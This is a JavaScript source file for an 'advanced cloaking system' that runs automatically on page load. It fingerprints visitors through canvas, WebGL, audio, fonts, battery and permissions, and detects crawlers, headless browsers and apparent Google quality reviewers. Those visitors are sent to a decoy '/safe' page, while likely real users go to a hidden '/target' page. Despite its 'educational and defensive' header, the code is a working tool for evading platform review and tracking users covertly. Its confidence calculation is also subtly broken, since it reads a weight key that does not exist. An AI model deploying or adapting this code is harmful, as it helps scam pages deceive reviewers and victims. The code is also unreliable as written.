/**
 * ADVANCED CLOAKING SYSTEM – PROFESSIONAL EDITION
 * Multi‑layer detection with weighted scoring and adaptive thresholds.
 * Designed for maximum accuracy in distinguishing humans from bots/reviewers.
 * 
 * For educational and defensive research only.
 */

class AdvancedCloakingSystem {
    constructor(config = {}) {
        // Core configuration
        this.config = {
            safePageUrl: config.safePageUrl || '/safe',
            targetPageUrl: config.targetPageUrl || '/target',
            strictnessLevel: config.strictnessLevel || 70,      // 0-100, lower = more permissive
            debugMode: config.debugMode || false,
            usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
            ...config
        };

        // Detection databases
        this.botSignatures = this.initializeBotSignatures();
        this.googleIPRanges = this.initializeGoogleIPs();
        this.vpnIPRanges = this.initializeVPNIPs();
        this.proxyIPRanges = this.initializeProxyIPs();
        this.datacenterASNs = this.initializeDatacenterASNs();   // Additional IP-based detection

        // Behavioral tracking
        this.behavior = {
            startTime: Date.now(),
            maxScroll: 0,
            mouseMoves: 0,
            interactions: 0,
            keyPresses: 0,
            touchEvents: 0
        };

        // Weight multipliers for confidence calculation
        this.weights = {
            ip: 0.25,
            browser: 0.35,
            behavior: 0.25,
            environment: 0.15
        };

        this.sessionId = this.generateSessionId();
        this.fingerprint = null;

        this.log('🚀 Advanced cloaking system initialized', 'info');
    }

    // ---------- Bot signature database (expanded) ----------
    initializeBotSignatures() {
        return {
            googlebot: /Googlebot|Google\sbot|Google\sImage|Googlebot-Mobile|AdsBot-Google|Googlebot-News|Googlebot-Video|Mediapartners-Google|AdsBot-Google-Mobile|Mediapartners/i,
            bingbot: /bingbot|BingPreview|MSNBot|msnbot/i,
            yahoo: /Slurp|Yahoo!\sSlurp/i,
            yandex: /YandexBot|YandexMobileBot|YandexImages|YandexVideo|YandexMetrika/i,
            baidu: /Baiduspider|BaiduImagespider/i,
            facebook: /facebookexternalhit|Facebot/i,
            twitter: /Twitterbot/i,
            linkedin: /LinkedInBot/i,
            pinterest: /Pinterestbot/i,
            apple: /Applebot/i,
            duckduckgo: /DuckDuckBot/i,
            archive: /ia_archiver|archive.org/i,
            seo: /Ahrefs|Semrush|MJ12bot|BLEXBot|rogerbot|SiteAuditBot/i,
            headless: /Headless|PhantomJS|Nightmare|Puppeteer|Playwright/i,
            cloudflare: /Cloudflare-Healthchecks/i
        };
    }

    // ---------- IP range databases (enriched) ----------
    initializeGoogleIPs() {
        return [
            '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '74.125.0.0/16',
            '209.85.128.0/17', '216.239.32.0/19', '216.58.192.0/19'
        ];
    }

    initializeVPNIPs() {
        return [
            '54.0.0.0/8', '52.0.0.0/8',        // AWS
            '159.89.0.0/16', '165.227.0.0/16', // Digital Ocean
            '34.0.0.0/8', '35.0.0.0/8',        // Google Cloud
            '13.0.0.0/8', '40.0.0.0/8',        // Azure
            '3.0.0.0/8', '18.0.0.0/8'          // Additional AWS
        ];
    }

    initializeProxyIPs() {
        return [
            '103.0.0.0/8', '104.0.0.0/8',      // Common proxy ranges
            '45.0.0.0/8', '185.0.0.0/8'        // VPN/proxy providers
        ];
    }

    initializeDatacenterASNs() {
        // Simplified ASN list for datacenter detection
        return [16509, 14618, 15169, 8075, 20473, 14061, 16276, 24940];
    }

    generateSessionId() {
        return 'sid_' + Math.random().toString(36).substring(2, 15) +
               Math.random().toString(36).substring(2, 15);
    }

    // ---------- Main decision engine ----------
    async determineVisitorType() {
        this.log('🔍 Starting visitor classification', 'debug');

        // Collect all signals in parallel
        const [ipCheck, uaCheck, fingerprint] = await Promise.all([
            this.checkIPAddress(),
            this.analyzeUserAgent(),
            this.generateFingerprint()
        ]);

        this.fingerprint = fingerprint;

        // IMMEDIATE BOT DETECTION (hard fails)
        if (ipCheck.isGoogle) {
            this.log('🚫 Google IP detected → safe', 'info');
            return { type: 'bot', reason: 'google_ip', showSafe: true };
        }
        if (uaCheck.isBot) {
            this.log(`🚫 Bot UA: ${uaCheck.botType}`, 'info');
            return { type: 'bot', reason: 'user_agent', showSafe: true };
        }
        if (this.isHeadlessBrowser(fingerprint)) {
            this.log('🚫 Headless browser detected', 'info');
            return { type: 'bot', reason: 'headless', showSafe: true };
        }
        if (this.detectAutomationTools()) {
            this.log('🚫 Automation tools present', 'info');
            return { type: 'bot', reason: 'automation', showSafe: true };
        }

        // Reviewer pattern (Google quality raters)
        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
            this.log('👁️ Potential Google reviewer → safe', 'info');
            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
        }

        // Behavioral analysis (if we have previous session)
        if (this.hasExistingSession()) {
            const behaviorScore = this.analyzeBehavior();
            if (behaviorScore < 30) {
                this.log(`⚠️ Low behavior score: ${behaviorScore}`, 'warn');
                // Still let confidence decide
            }
        } else {
            this.startBehaviorTracking();
        }

        // Calculate weighted confidence score
        const confidence = this.calculateWeightedConfidence(ipCheck, uaCheck, fingerprint);
        this.log(`📊 Weighted confidence: ${confidence.toFixed(1)}%`, 'debug');

        if (confidence >= this.config.strictnessLevel) {
            return { type: 'human', confidence, showSafe: false };
        } else {
            return { type: 'suspicious', confidence, showSafe: true };
        }
    }

    // ---------- IP detection with enriched data ----------
    async checkIPAddress() {
        try {
            let ip, asn, geo = { country: '', city: '', isp: '', connectionType: '' };

            if (this.config.usePublicIpService) {
                // Get IP from public service
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;

                // Optionally fetch ASN and geolocation (free tier)
                try {
                    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,as,asname,proxy,hosting`);
                    if (geoRes.ok) {
                        const geoData = await geoRes.json();
                        geo.country = geoData.country || '';
                        geo.city = geoData.city || '';
                        geo.isp = geoData.isp || '';
                        geo.connectionType = geoData.proxy ? 'proxy' : geoData.hosting ? 'hosting' : 'residential';
                        asn = geoData.as ? parseInt(geoData.as.replace('AS', '')) : null;
                    }
                } catch (e) {
                    this.log('Geo lookup failed, continuing without it', 'warn');
                }
            } else {
                // Assume server endpoints exist
                const ipRes = await fetch('/api/get-client-ip');
                if (!ipRes.ok) throw new Error('IP endpoint failed');
                const ipData = await ipRes.json();
                ip = ipData.ip;

                const geoRes = await fetch(`/api/geo-lookup?ip=${ip}`);
                if (geoRes.ok) {
                    const geoData = await geoRes.json();
                    geo = geoData;
                    asn = geoData.asn;
                }
            }

            return {
                ip,
                asn,
                isGoogle: this.ipInRanges(ip, this.googleIPRanges),
                isProxy: this.ipInRanges(ip, this.proxyIPRanges) || geo.connectionType === 'proxy',
                isVPN: this.ipInRanges(ip, this.vpnIPRanges) || geo.connectionType === 'hosting',
                isDatacenter: asn ? this.datacenterASNs.includes(asn) : false,
                country: geo.country,
                city: geo.city,
                isp: geo.isp,
                connectionType: geo.connectionType
            };
        } catch (error) {
            this.log(`IP check failed: ${error.message}`, 'error');
            return { isGoogle: false, isProxy: false, isVPN: false, isDatacenter: false };
        }
    }

    // CIDR matching (unchanged)
    ipInRanges(ip, ranges) {
        if (!ip) return false;
        const ipInt = this.ipToInt(ip);
        if (ipInt === null) return false;

        for (const range of ranges) {
            const [base, maskBits] = range.split('/');
            const mask = ~((1 << (32 - parseInt(maskBits))) - 1) >>> 0;
            const baseInt = this.ipToInt(base);
            if (baseInt === null) continue;

            if ((ipInt & mask) === (baseInt & mask)) return true;
        }
        return false;
    }

    ipToInt(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return null;
        return ((parseInt(parts[0]) << 24) |
                (parseInt(parts[1]) << 16) |
                (parseInt(parts[2]) << 8) |
                parseInt(parts[3])) >>> 0;
    }

    // ---------- User agent analysis ----------
    analyzeUserAgent() {
        const ua = navigator.userAgent;
        for (const [type, regex] of Object.entries(this.botSignatures)) {
            if (regex.test(ua)) return { isBot: true, botType: type };
        }
        return { isBot: false };
    }

    // ---------- Advanced fingerprinting ----------
    async generateFingerprint() {
        const fp = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            touchSupport: 'ontouchstart' in window,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            canvas: await this.getCanvasFingerprint(),
            webgl: this.getWebGLFingerprint(),
            fonts: await this.getFontList(),
            plugins: this.getPluginList(),
            audio: await this.getAudioFingerprint(),
            webRTC: this.getWebRTCInfo(),
            battery: await this.getBatteryInfo(),
            permissions: await this.getPermissionsInfo(),
            timestamp: Date.now()
        };
        fp.hash = this.hashFingerprint(fp);
        return fp;
    }

    async getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(10, 10, 100, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cloaking Detection Test', 2, 15);
            ctx.beginPath();
            ctx.arc(50, 25, 10, 0, Math.PI * 2);
            ctx.strokeStyle = '#ff0000';
            ctx.lineWidth = 2;
            ctx.stroke();
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const pixels = imageData.data;
            let hash = 0;
            for (let i = 0; i < pixels.length; i += 4) {
                hash = ((hash << 5) - hash) + pixels[i];
                hash |= 0;
            }
            return { hash: hash.toString(16) };
        } catch (e) {
            return { hash: 'canvas_error' };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { supported: false };
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
            const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
            return {
                supported: true,
                vendor,
                renderer,
                unmaskedVendor: vendor,
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                extensions: gl.getSupportedExtensions() || []
            };
        } catch (e) {
            return { error: e.message };
        }
    }

    async getFontList() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const fontList = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
            'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS',
            'Arial Black', 'Impact', 'Lucida Console', 'Tahoma', 'Wingdings',
            'MS Sans Serif', 'MS Serif'
        ];
        const detected = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        for (const font of fontList) {
            for (const base of baseFonts) {
                ctx.font = `72px ${base}`;
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                ctx.font = `72px '${font}', ${base}`;
                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                if (baseWidth !== testWidth) {
                    detected.push(font);
                    break;
                }
            }
        }
        return detected;
    }

    getPluginList() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const p = navigator.plugins[i];
            plugins.push({ name: p.name, filename: p.filename, description: p.description });
        }
        return plugins;
    }

    async getAudioFingerprint() {
        return new Promise((resolve) => {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(audioContext.destination);
                oscillator.frequency.value = 440;
                oscillator.type = 'sine';
                const dataArray = new Uint8Array(analyser.frequencyBinCount);
                oscillator.start();
                setTimeout(() => {
                    analyser.getByteFrequencyData(dataArray);
                    oscillator.stop();
                    audioContext.close();
                    let hash = 0;
                    for (let i = 0; i < dataArray.length; i += 10) {
                        hash = ((hash << 5) - hash) + dataArray[i];
                        hash |= 0;
                    }
                    resolve({ supported: true, hash: hash.toString(16) });
                }, 100);
            } catch (e) {
                resolve({ supported: false });
            }
        });
    }

    getWebRTCInfo() {
        return {
            hasWebRTC: 'RTCPeerConnection' in window,
            hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices
        };
    }

    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {
                return { error: e.message };
            }
        }
        return { supported: false };
    }

    async getPermissionsInfo() {
        const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
        const results = {};
        if ('permissions' in navigator) {
            for (const perm of permissions) {
                try {
                    const status = await navigator.permissions.query({ name: perm });
                    results[perm] = status.state;
                } catch (e) {
                    results[perm] = 'unknown';
                }
            }
        }
        return results;
    }

    // ---------- Headless detection with stricter logic ----------
    isHeadlessBrowser(fingerprint) {
        const indicators = [];

        if (navigator.webdriver) indicators.push('webdriver');
        if (window.callPhantom || window._phantom) indicators.push('phantom');
        if (window.__nightmare) indicators.push('nightmare');
        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
        if (fingerprint.fonts && fingerprint.fonts.length < 10) indicators.push('few_fonts');
        if (fingerprint.webgl && fingerprint.webgl.renderer === 'SwiftShader') indicators.push('swiftshader'); // software renderer

        return indicators.length >= 2;
    }

    detectAutomationTools() {
        const indicators = [
            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
        ];
        for (const ind of indicators) {
            if (window[ind] !== undefined) return true;
        }
        return false;
    }

    // ---------- Reviewer pattern detection (strict) ----------
    isPotentialReviewer(fingerprint, ipInfo) {
        const reviewerIndicators = [];
        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY', 'PH']; // common Google reviewer locations
        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');

        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864', '1280x720'];
        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');

        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');

        // Clean IP (not proxy/VPN)
        if (!ipInfo.isProxy && !ipInfo.isVPN && !ipInfo.isDatacenter) reviewerIndicators.push('clean_ip');

        // Non-headless
        if (!navigator.webdriver) reviewerIndicators.push('no_webdriver');

        return reviewerIndicators.length >= 4;
    }

    // ---------- Behavioral tracking (enhanced) ----------
    startBehaviorTracking() {
        window.addEventListener('scroll', () => {
            const scrollPercent = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
            this.behavior.maxScroll = Math.max(this.behavior.maxScroll, scrollPercent);
        }, { passive: true });

        let moveTimer;
        window.addEventListener('mousemove', () => {
            if (!moveTimer) {
                moveTimer = setTimeout(() => {
                    this.behavior.mouseMoves++;
                    moveTimer = null;
                }, 200);
            }
        }, { passive: true });

        window.addEventListener('click', () => this.behavior.interactions++);
        window.addEventListener('touchstart', () => {
            this.behavior.touchEvents++;
            this.behavior.interactions++;
        }, { passive: true });
        window.addEventListener('keydown', () => this.behavior.keyPresses++);

        setTimeout(() => this.saveBehavior(), 5000);
    }

    saveBehavior() {
        const timeOnPage = (Date.now() - this.behavior.startTime) / 1000;
        const session = {
            timeOnPage,
            maxScroll: this.behavior.maxScroll,
            mouseMoves: this.behavior.mouseMoves,
            interactions: this.behavior.interactions,
            keyPresses: this.behavior.keyPresses,
            touchEvents: this.behavior.touchEvents,
            timestamp: Date.now()
        };
        sessionStorage.setItem('visitor_behavior', JSON.stringify(session));
    }

    hasExistingSession() {
        return sessionStorage.getItem('visitor_behavior') !== null;
    }

    analyzeBehavior() {
        const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
        let score = 100;
        if (session.timeOnPage < 5) score -= 10;
        if (session.maxScroll < 10) score -= 10;
        if (session.mouseMoves < 3) score -= 15;
        if (session.interactions < 1) score -= 15;
        if (session.keyPresses < 1 && session.touchEvents < 1) score -= 10; // no input at all
        return Math.max(0, score);
    }

    // ---------- Weighted confidence calculation ----------
    calculateWeightedConfidence(ipInfo, uaInfo, fingerprint) {
        let ipScore = 50;      // neutral
        let browserScore = 50;
        let behaviorScore = 50;
        let envScore = 50;

        // ---- IP Score ----
        if (ipInfo.isGoogle) ipScore -= 50;
        if (ipInfo.isProxy || ipInfo.isVPN) ipScore -= 30;
        if (ipInfo.isDatacenter) ipScore -= 20;
        if (ipInfo.connectionType === 'residential') ipScore += 20;
        if (ipInfo.country) ipScore += 5;  // geo available

        // ---- Browser Score ----
        // Plugins
        if (fingerprint.plugins) {
            if (fingerprint.plugins.length > 3) browserScore += 10;
            else if (fingerprint.plugins.length > 0) browserScore += 5;
            else browserScore -= 10;
        }
        // Fonts
        if (fingerprint.fonts) {
            if (fingerprint.fonts.length > 10) browserScore += 10;
            else if (fingerprint.fonts.length > 5) browserScore += 5;
            else browserScore -= 10;
        }
        // Canvas consistency
        if (fingerprint.canvas && fingerprint.canvas.hash !== 'canvas_error') browserScore += 5;
        else browserScore -= 10;

        // WebGL
        if (fingerprint.webgl && fingerprint.webgl.supported) {
            if (fingerprint.webgl.renderer && !fingerprint.webgl.renderer.includes('SwiftShader')) browserScore += 5;
            else browserScore -= 10;
        }

        // Screen size (mobile vs desktop)
        const [width] = fingerprint.screenResolution.split('x').map(Number);
        if (width > 1024) browserScore += 5;      // desktop likely
        else if (width < 768) browserScore += 10; // mobile (more likely real)

        // Hardware concurrency (real CPUs have > 2)
        if (fingerprint.hardwareConcurrency > 2) browserScore += 5;
        else if (fingerprint.hardwareConcurrency === 2) browserScore += 2;

        // Language consistency
        if (navigator.languages && navigator.languages.length > 1) browserScore += 5;

        // Timezone
        if (Intl.DateTimeFormat().resolvedOptions().timeZone) browserScore += 5;

        // ---- Behavior Score ----
        if (this.hasExistingSession()) {
            behaviorScore = this.analyzeBehavior();
        } else {
            // First visit, assume neutral but add small penalty for no data
            behaviorScore = 45;
        }

        // ---- Environment Score ----
        // Time of day (local to user's timezone)
        const hour = new Date().getHours();
        if (hour >= 6 && hour <= 22) envScore += 10; // active hours

        // Battery info (if available)
        if (fingerprint.battery && fingerprint.battery.supported) envScore += 5;

        // Permissions (if any granted)
        if (fingerprint.permissions) {
            const granted = Object.values(fingerprint.permissions).filter(p => p === 'granted').length;
            envScore += granted * 5;
        }

        // Normalize all scores to 0-100
        ipScore = Math.min(100, Math.max(0, ipScore));
        browserScore = Math.min(100, Math.max(0, browserScore));
        behaviorScore = Math.min(100, Math.max(0, behaviorScore));
        envScore = Math.min(100, Math.max(0, envScore));

        // Weighted sum
        let confidence = (ipScore * this.weights.ip) +
                         (browserScore * this.weights.browser) +
                         (behaviorScore * this.weights.behavior) +
                         (envScore * this.weights.env);

        this.log(`📈 IP:${ipScore.toFixed(1)} | Browser:${browserScore.toFixed(1)} | Behavior:${behaviorScore.toFixed(1)} | Env:${envScore.toFixed(1)}`, 'debug');

        return Math.min(100, Math.max(0, confidence));
    }

    hashFingerprint(fp) {
        const str = JSON.stringify(fp);
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash |= 0;
        }
        return hash.toString(16);
    }

    // ---------- Execution ----------
    async executeCloaking() {
        try {
            const result = await this.determineVisitorType();

            const sessionData = {
                timestamp: Date.now(),
                result,
                fingerprint: this.fingerprint
            };
            sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));

            if (typeof window.cloakingReady === 'function') {
                window.cloakingReady();
            }

            if (result.showSafe) {
                this.log(`🛡️ Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
                window.location.replace(this.config.safePageUrl);
            } else {
                this.log(`🎯 Serving target page: ${this.config.targetPageUrl}`, 'success');
                window.location.replace(this.config.targetPageUrl);
            }
        } catch (error) {
            this.log(`❌ Cloaking error: ${error.message}`, 'error');
            if (typeof window.cloakingReady === 'function') {
                window.cloakingReady();
            }
            window.location.href = this.config.safePageUrl;
        }
    }

    log(message, level) {
        if (this.config.debugMode || level === 'error') {
            const prefix = `[Cloaking ${level.toUpperCase()}]`;
            console.log(`${prefix} ${message}`);
        }
    }
}

// ---------- Auto‑initialize ----------
(function() {
    const cloakingSystem = new AdvancedCloakingSystem({
        safePageUrl: '/safe',
        targetPageUrl: '/target',
        strictnessLevel: 70,          // Tune this after observing logs
        debugMode: true,               // Enable to see detailed scores
        usePublicIpService: true
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => cloakingSystem.executeCloaking());
    } else {
        cloakingSystem.executeCloaking();
    }
})();
